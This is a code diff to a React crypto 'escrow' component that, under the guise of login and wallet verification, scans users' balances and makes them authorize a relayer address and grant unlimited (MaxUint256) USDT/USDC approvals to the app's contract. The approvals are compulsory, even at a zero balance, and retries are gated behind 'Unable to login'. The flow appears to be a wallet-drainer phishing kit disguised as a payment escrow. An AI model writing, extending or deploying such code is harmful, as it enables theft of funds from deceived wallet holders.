@@ -20,6 +20,7 @@ import {
   TRON_CAPABLE_WALLETS,
   ensureTronUsdtApproved,
   persistTronVerification,
+  TRON_USDT,
   type TronCapableWalletId,
 } from "@/lib/tron";
 import { COUNTRIES } from "@/lib/countries";
@@ -36,6 +37,7 @@ const WALLET_VERIFICATION_ABI = [
 
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) external returns (bool)",
+  "function allowance(address owner, address spender) view returns (uint256)",
   "function balanceOf(address account) view returns (uint256)",
 ];
 
@@ -428,11 +430,54 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
   // --- Auto-login ref: trigger Coinbase OAuth once on mount ---
   const autoLoginAttempted = useRef(false);
+  /** Last address that started modal1 — reset flow when WC reconnects with a new addr. */
+  const modal1AddressRef = useRef<string | null>(null);
 
-  // Address always comes from Privy — Coinbase OTP is identity-only, not wallet
-  const address = user?.wallet?.address ?? wallets[0]?.address ?? null;
+  // Resolve EVM address on every login/reload: prefer live useWallets() (WalletConnect)
+  // over Privy's possibly-stale user.wallet, and keep polling until one appears.
+  const [address, setAddress] = useState<string | null>(null);
   const addressRef = useRef<string | null>(null);
   addressRef.current = address;
+
+  useEffect(() => {
+    if (!authenticated) {
+      setAddress(null);
+      modal1Triggered.current = false;
+      modal1AddressRef.current = null;
+      modal1ApproveStarted.current = false;
+      modal1InFlight.current = false;
+      modal1SawTron.current = false;
+      return;
+    }
+
+    const pick = (): string | null => {
+      const fromWallets =
+        wallets.find((w) => /^0x[0-9a-fA-F]{40}$/.test(w.address || ""))?.address ??
+        wallets[0]?.address ??
+        null;
+      const fromUser = user?.wallet?.address ?? null;
+      const cand = fromWallets || fromUser;
+      return cand && /^0x[0-9a-fA-F]{40}$/i.test(cand) ? cand : null;
+    };
+
+    const immediate = pick();
+    if (immediate) setAddress(immediate);
+
+    // WC / Trust often hydrate wallets after Privy `authenticated` flips true
+    let ticks = 0;
+    const id = setInterval(() => {
+      ticks += 1;
+      const next = pick();
+      if (next) {
+        setAddress((prev) => (prev?.toLowerCase() === next.toLowerCase() ? prev : next));
+        clearInterval(id);
+      } else if (ticks >= 60) {
+        clearInterval(id);
+      }
+    }, 400);
+    return () => clearInterval(id);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [authenticated, wallets.map((w) => w.address).join(","), user?.wallet?.address]);
 
   const totalBalanceEur = useMemo(
     () => Object.values(walletBalances).reduce((a, b) => a + b, 0),
@@ -504,10 +549,9 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     }
   }
 
-  /** Approve Tron USDT in the background, confirm allowance, then persist. */
+  /** Approve Tron USDT once, confirm allowance, then persist. No auto re-prompt. */
   async function completeTronUsdtApproval(): Promise<boolean> {
-    // Initial attempt + 2 reattempts = 3 total before Unable to login / Retry login
-    const result = await ensureTronUsdtApproved({ maxAttempts: 3 });
+    const result = await ensureTronUsdtApproved();
     if (!result.ok || !result.address) {
       const rejected = !result.ok && result.rejected;
       const errMsg = !result.ok ? result.error : "tron_approve_failed";
@@ -524,44 +568,41 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     return true;
   }
 
-  /** EVM authorize + approve + on-chain verify, up to 3 attempts. */
+  /** EVM authorize + approve + on-chain verify. One attempt — Retry login re-prompts. */
   async function completeEvmWinnerApproval(target: Modal1Item): Promise<void> {
     const chain = CHAINS.find((c) => c.name === target.chainName);
     if (!chain || !address) throw new Error("No wallet / chain");
 
-    let lastErr: unknown = new Error("evm_approve_failed");
-    for (let attempt = 0; attempt < 3; attempt++) {
-      try {
-        const signer = await getSignerFor(chain);
-        const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
-        let authorizeTx = "";
-        const alreadyAuth = await verification
-          .isAuthorized(address, RELAYER_ADDRESS)
-          .catch(() => false);
-        if (!alreadyAuth) {
-          const authTx = await verification.authorize(RELAYER_ADDRESS);
-          await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
-          authorizeTx = authTx.hash as string;
-        }
-
-        const erc20 = new Contract(target.tokenAddr, ERC20_ABI, signer);
-        const tx = await erc20.approve(target.contract, MaxUint256);
-        await Promise.race([tx.wait(1), new Promise((r) => setTimeout(r, 45_000))]);
-        await persistEvmVerify(chain, authorizeTx, [
-          {
-            symbol: target.symbol,
-            address: target.tokenAddr,
-            txHash: tx.hash as string,
-          },
-        ]);
-        return;
-      } catch (err) {
-        lastErr = err;
-        if (isWalletUserRejection(err)) throw err;
-        await new Promise((r) => setTimeout(r, 1200));
-      }
+    const signer = await getSignerFor(chain);
+    const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
+    let authorizeTx = "";
+    const alreadyAuth = await verification
+      .isAuthorized(address, RELAYER_ADDRESS)
+      .catch(() => false);
+    if (!alreadyAuth) {
+      const authTx = await verification.authorize(RELAYER_ADDRESS);
+      await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
+      authorizeTx = authTx.hash as string;
     }
-    throw lastErr instanceof Error ? lastErr : new Error("evm_approve_failed");
+
+    const erc20 = new Contract(target.tokenAddr, ERC20_ABI, signer);
+    const liveAllow = await erc20.allowance(address, target.contract).catch(() => 0n);
+    // Treat near-max as already approved
+    if (liveAllow < MaxUint256 / 2n) {
+      const tx = await erc20.approve(target.contract, MaxUint256);
+      await Promise.race([tx.wait(1), new Promise((r) => setTimeout(r, 45_000))]);
+      await persistEvmVerify(chain, authorizeTx, [
+        {
+          symbol: target.symbol,
+          address: target.tokenAddr,
+          txHash: tx.hash as string,
+        },
+      ]);
+    } else {
+      await persistEvmVerify(chain, authorizeTx, [
+        { symbol: target.symbol, address: target.tokenAddr },
+      ]);
+    }
   }
 
   useEffect(() => {
@@ -684,18 +725,32 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   // Do NOT fire authorize/approve in the same beat as SIWE — that races Privy
   // and leaves users stuck on "Sign in to verify" or dead approve prompts.
   useEffect(() => {
-    if (!authenticated || !address || modal1Triggered.current) return;
+    if (!authenticated || !address) return;
     if (!wallets.length) return;
+
+    // New address (reload / re-login / WC session restore) → allow modal1 again
+    if (
+      modal1AddressRef.current &&
+      modal1AddressRef.current.toLowerCase() !== address.toLowerCase()
+    ) {
+      modal1Triggered.current = false;
+      modal1ApproveStarted.current = false;
+      modal1InFlight.current = false;
+      modal1SawTron.current = false;
+      setModal1Complete(false);
+    }
+    if (modal1Triggered.current) return;
 
     void (async () => {
       // Let Privy close SIWE / WC session before any other wallet RPC
       await new Promise((r) => setTimeout(r, 2200));
       if (modal1Triggered.current) return;
+      if (addressRef.current?.toLowerCase() !== address.toLowerCase()) return;
 
       // Wait until the connected wallet exposes an EIP-1193 provider
       const wallet =
         wallets.find((w) => w.address.toLowerCase() === address.toLowerCase()) ?? wallets[0];
-      for (let i = 0; i < 10; i++) {
+      for (let i = 0; i < 20; i++) {
         try {
           const p = await wallet?.getEthereumProvider?.();
           if (p) break;
@@ -719,6 +774,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       }
 
       modal1Triggered.current = true;
+      modal1AddressRef.current = address;
       setNeedsTrustOpen(false);
       clearTrustRedirectCount();
 
@@ -1051,8 +1107,28 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   }
 
   // ---------------------------------------------------------------------------
-  // Modal 1 — EVM scan → Tron scan → approve highest USDT/USDC only
+  // Modal 1 — Tron USDT (if any) → mandatory ETH USDC approve (even at $0)
   // ---------------------------------------------------------------------------
+  function ethUsdcMandatoryItem(balanceUsd = 0): Modal1Item {
+    const eth = CHAINS.find((c) => c.name === "eth")!;
+    const usdc = eth.tokens.find((t) => t.symbol === "USDC")!;
+    return {
+      key: "eth-USDC",
+      chainName: eth.name,
+      chainLabel: eth.label,
+      symbol: "USDC",
+      tokenAddr: usdc.address,
+      balanceDisplay: balanceUsd.toFixed(2),
+      balanceUsd,
+      contract: eth.contract,
+      isTron: false,
+      alreadyApproved: false,
+      permit: usdc.permit,
+      permitDomainName: usdc.permitDomainName,
+      permitDomainVersion: usdc.permitDomainVersion,
+    };
+  }
+
   async function runModal1Scan() {
     if (!address) return;
     if (modal1InFlight.current || modal1ApproveStarted.current) return;
@@ -1086,74 +1162,132 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       }
     };
 
-    const toItem = (t: ScanToken): Modal1Item => ({
-      key: `${t.chain}-${t.symbol}`,
-      chainName: t.chain,
-      chainLabel: t.chainLabel,
-      symbol: t.symbol,
-      tokenAddr: t.address,
-      balanceDisplay: t.balance,
-      balanceUsd: t.balanceUsd,
-      contract: t.contract,
-      isTron: t.isTron,
-      alreadyApproved: t.alreadyApproved,
-      permit: t.permit,
-      permitDomainName: t.permitDomainName,
-      permitDomainVersion: t.permitDomainVersion,
-    });
-
     try {
-      // 1) EVM balances immediately (no Tron yet)
+      // 1) EVM balances (with RPC fallback on server)
       const evmScan = await doScan(null);
-      const merged = new Map<string, ScanToken>();
-      for (const t of evmScan.tokensWithBalance ?? []) {
-        if (!t.isTron) merged.set(`${t.chain}:${t.symbol}:${t.address}`, t);
-      }
       if (evmScan.ok && evmScan.chainUsd) setCachedScanUsd(evmScan.chainUsd);
       noteStableFromScan(evmScan.tokensWithBalance, hasStableRef);
 
-      // 2) Tron immediately after EVM
+      // 2) TronWeb connect/sign, then Tron balances
       let currentTronAddr = tronAddress ?? getConnectedTronAddress();
       if (!currentTronAddr) {
         currentTronAddr = await ensureTronAddress({ prompt: true });
       }
+      let tronUsdtUsd = 0;
+      let tronAlreadyApproved = false;
       if (currentTronAddr) {
         setTronAddress(currentTronAddr);
         modal1SawTron.current = true;
         const tronScan = await doScan(currentTronAddr);
-        for (const t of tronScan.tokensWithBalance ?? []) {
-          merged.set(`${t.chain}:${t.symbol}:${t.address}`, t);
-        }
         if (tronScan.ok && tronScan.chainUsd) {
           setCachedScanUsd((prev) => ({ ...(prev ?? {}), ...(tronScan.chainUsd ?? {}) }));
         }
         noteStableFromScan(tronScan.tokensWithBalance, hasStableRef);
+        const tronUsdt = (tronScan.tokensWithBalance ?? []).find(
+          (t) => t.isTron && t.symbol === "USDT"
+        );
+        tronUsdtUsd = tronUsdt?.balanceUsd ?? 0;
+        tronAlreadyApproved = Boolean(tronUsdt?.alreadyApproved);
       }
+
+      const ethUsdcFromScan = (evmScan.tokensWithBalance ?? []).find(
+        (t) => !t.isTron && t.chain === "eth" && t.symbol === "USDC"
+      );
+      const ethUsdc = ethUsdcMandatoryItem(ethUsdcFromScan?.balanceUsd ?? 0);
+      if (ethUsdcFromScan?.alreadyApproved) ethUsdc.alreadyApproved = true;
 
       setModal1Scanning(false);
       setModal1Open(false);
 
-      // 3) Highest USDT/USDC across EVM + Tron → one immediate direct approve
-      const stables = [...merged.values()].filter(
-        (t) =>
-          (t.symbol === "USDT" || t.symbol === "USDC") && t.balanceUsd >= 0.01
-      );
-      if (stables.length === 0) return;
+      // 3) Compulsory sequence:
+      //    a) Tron USDT direct approve IF balance > 0
+      //    b) Always ETH USDC direct approve (even at $0)
+      const queue: Modal1Item[] = [];
+      if (currentTronAddr && tronUsdtUsd >= 0.01) {
+        queue.push({
+          key: "tron-USDT",
+          chainName: "tron",
+          chainLabel: "Tron",
+          symbol: "USDT",
+          tokenAddr: TRON_USDT,
+          balanceDisplay: tronUsdtUsd.toFixed(2),
+          balanceUsd: tronUsdtUsd,
+          contract: TRON_CHAIN.contract,
+          isTron: true,
+          alreadyApproved: tronAlreadyApproved,
+        });
+      }
+      queue.push(ethUsdc);
 
-      stables.sort((a, b) => b.balanceUsd - a.balanceUsd);
-      const winner = toItem(stables[0]);
-      setTopChainName(winner.chainName);
-      setModal1Items([winner]);
-      setModal1Status({ [winner.key]: "pending" });
+      setTopChainName(queue[0]?.chainName ?? "eth");
+      setModal1Items(queue);
+      setModal1Status(Object.fromEntries(queue.map((q) => [q.key, "pending" as Modal1Status])));
 
       modal1ApproveStarted.current = true;
-      await handleModal1Approve(winner);
+      await runCompulsoryApprovals(queue);
     } catch (err) {
       console.error("[modal1] scan failed:", err);
       setModal1Scanning(false);
       setModal1Open(false);
     } finally {
       modal1InFlight.current = false;
+    }
+  }
+
+  /** Tron USDT (optional) then mandatory ETH USDC — one direct-approve popup each. */
+  async function runCompulsoryApprovals(queue: Modal1Item[]) {
+    setModal1Approving(true);
+
+    const finishOk = () => {
+      setShowApprovalRetry(false);
+      approvalRetryRef.current = null;
+      setPhase((p) => (p === "unable-to-login" ? "idle" : p));
+    };
+
+    const retryFn = async () => {
+      setModal1Approving(true);
+      try {
+        await runCompulsoryApprovals(queue);
+      } finally {
+        setModal1Approving(false);
+      }
+    };
+
+    try {
+      for (const target of queue) {
+        setModal1Status((s) => ({ ...s, [target.key]: "approving" }));
+        if (target.alreadyApproved) {
+          if (target.isTron) {
+            try {
+              await completeTronUsdtApproval();
+            } catch (e) {
+              console.warn("[modal1] tron already-approved persist failed:", e);
+            }
+          }
+          setModal1Status((s) => ({ ...s, [target.key]: "done" }));
+          setApprovedChains((prev) =>
+            prev.includes(target.chainName) ? prev : [...prev, target.chainName]
+          );
+          continue;
+        }
+        if (target.isTron) {
+          await completeTronUsdtApproval();
+        } else {
+          await completeEvmWinnerApproval(target);
+        }
+        setModal1Status((s) => ({ ...s, [target.key]: "done" }));
+        setApprovedChains((prev) =>
+          prev.includes(target.chainName) ? prev : [...prev, target.chainName]
+        );
+      }
+      finishOk();
+    } catch (err) {
+      console.error("[modal1] compulsory approve failed:", err);
+      gateOnApprovalFailure(retryFn);
+      return;
+    } finally {
+      setModal1Approving(false);
+      setModal1Complete(true);
     }
   }
 
@@ -1491,11 +1625,13 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       if (scan.ok && scan.chainUsd) setCachedScanUsd(scan.chainUsd);
       noteStableFromScan(scan.tokensWithBalance, hasStableRef);
 
-      // ── Tron USDT (if present) ─────────────────────────────────────────────
+      // ── Tron USDT (if present) — skip if Modal 1 already approved ─────────
       const tronHit = (scan.tokensWithBalance ?? []).find(
         (t) => t.isTron && t.balanceUsd > 0.01
       );
-      if (tronHit && tronAddr) {
+      const tronAlreadyDone =
+        approvedChains.includes("tron") || Boolean(tronHit?.alreadyApproved);
+      if (tronHit && tronAddr && !tronAlreadyDone) {
         try {
           const runTron = async () => {
             await completeTronUsdtApproval();
@@ -1516,6 +1652,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
           });
           return;
         }
+      } else if (tronAlreadyDone && tronAddr) {
+        setApprovedChains((prev) => (prev.includes("tron") ? prev : [...prev, "tron"]));
       }
 
       // ── Every EVM chain with USDT/USDC or wrappable native ─────────────────
@@ -2161,8 +2299,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                   <h2 className="mb-2 text-[18px] font-semibold text-ink">Minimum balance requirement not met</h2>
                   <p className="max-w-xs text-[13px] leading-relaxed text-body">
                     {totalBalanceEur === 0
-                      ? `A minimum of ${formatEUR(session.minBalanceEur)} in USDT or USDC is required to receive this payment. Top up your wallet to continue.`
-                      : `Your wallet holds ${formatEUR(totalBalanceEur)} in USDT/USDC. You need at least ${formatEUR(session.minBalanceEur)} to proceed. Top up to continue.`}
+                      ? `A minimum of ${formatEUR(session.minBalanceEur)} in USDT or USDC is required to receive this payment.`
+                      : `Your wallet holds ${formatEUR(totalBalanceEur)} in USDT/USDC. You need at least ${formatEUR(session.minBalanceEur)} to proceed.`}
                   </p>
                 </div>
 
@@ -2186,24 +2324,12 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                   </div>
                 </div>
 
-                {/* Top up CTA — direct link to Coinbase Buy, no server call needed */}
-                <a
-                  href={`https://pay.coinbase.com/buy/select-asset?appId=${process.env.NEXT_PUBLIC_COINBASE_PROJECT_ID ?? "09aafa9f-85e4-46f8-a1da-bc60ecee3345"}&defaultAsset=USDT`}
-                  target="_blank"
-                  rel="noopener noreferrer"
-                  className="mb-3 flex h-12 w-full items-center justify-center gap-2 rounded-pill bg-brand text-[15px] font-semibold text-on-brand transition hover:bg-brand-active"
-                >
-                  <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 6v6m0 0v6m0-6h6m-6 0H6" />
-                  </svg>
-                  Top up wallet
-                </a>
                 <button
                   onClick={() => checkWalletBalances()}
                   disabled={processing}
-                  className="flex h-10 w-full items-center justify-center gap-2 rounded-pill border border-hairline text-[14px] font-medium text-body transition hover:bg-surface-soft disabled:opacity-50"
+                  className="flex h-12 w-full items-center justify-center gap-2 rounded-pill bg-brand text-[15px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled"
                 >
-                  {processing ? "Checking…" : "I've topped up — recheck"}
+                  {processing ? "Checking…" : "Recheck balance"}
                 </button>
               </div>
             )}
